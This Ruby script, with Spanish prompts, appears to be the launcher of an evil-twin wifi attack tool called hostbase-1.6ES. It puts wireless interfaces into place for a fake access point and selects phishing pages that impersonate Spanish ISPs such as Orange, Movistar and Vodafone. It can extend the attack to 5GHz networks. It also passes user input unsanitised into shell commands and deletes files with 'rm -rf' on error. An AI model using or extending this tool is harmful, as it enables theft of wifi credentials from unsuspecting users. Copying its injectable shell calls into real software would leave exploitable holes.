#!/usr/bin/env ruby


require 'open3'
require 'highline/import'
require './berate'

def error
puts "\e[1;31m[*] ERROR detectado: salida del script dentro 5s.\e[0m"
sleep 5
abort("BYE..")
end

File.open("scancarte.txt").readlines.each do |scancarte|
   puts scancarte
$scancarte = scancarte.chomp
end

`ip link set #{$scancarte} down`
`iw dev #{$scancarte} set type managed`
`ip link set #{$scancarte} up`

puts "\e[1;33m[*] Interfaz wifi:\e[0m"
system"airmon-ng"
puts "Interfaz para el fake AP: "
$carte = gets.chomp
puts "#{$carte} para el fake AP"
if $carte.chomp.start_with?('wlan', 'wlx', 'wlp')
  `echo #{$carte} > carte.txt`
   puts "\e[1;32m[*] Vérificacion de la interfaz wifi... OK.\e[0m"
else
`rm -rf *.txt`
`rm -rf /tmp/hostbase-1.6ES`
error()
end


puts "Pagina de phishing: "
$page = gets.chomp
puts "#{$page} como pagina de phishing del fake AP"
if $page.chomp.start_with?('orangewp', 'jazztelwp', 'movistarwp', 'vodafonewp', '404', 'onowp')
`echo #{$page} > page.txt`
   puts "\e[1;32m[*] Pagina de phishing... OK.\e[0m"
else
`rm -rf *.txt`
`rm -rf /tmp/hostbase-1.6ES`
error()
end


if File.read('carte.txt').include?('wlan0')
  `echo wlan1 > cartedos.txt`
else
  `echo wlan0 > cartedos.txt`
end 

puts "\e[1;94m[*] Se quiere atacar la red en 5GHz tambien ?: si/no (entrar si necesita una tercera interfaz wifi compatible 5GHz): \e[0m"
  choix = gets.chomp
  case choix

  when 'si'
  load 'scan5g.rb'
File.open("cartef.txt").readlines.each do |cartef|
   puts cartef
$cartef = cartef.chomp
end
`ip link set #{$cartef} down`
`iw dev #{$cartef} set type managed`
`ip link set #{$cartef} up`
load 'interface2g.rb'
puts"Vérificacion de la red..."
load 'compare.rb'


  `cp -R $(pwd) *.txt /tmp/hostbase-1.6ES`
  puts "Berate"
  Berate.berateNormal
  when 'no'
    puts "Has eligido de atacar la red solamente en 2.4GHz"
    `cp -R $(pwd) *.txt /tmp/hostbase-1.6ES`
    puts"Berate"# on balance berate 
    Berate.berateNormal
    else
    puts "\e[1;31m[*] ERROR: se elige (si/no) !\e[0m"
    `rm -rf *.txt`
    `rm -rf /tmp/hostbase-1.6ES`
    error()
end
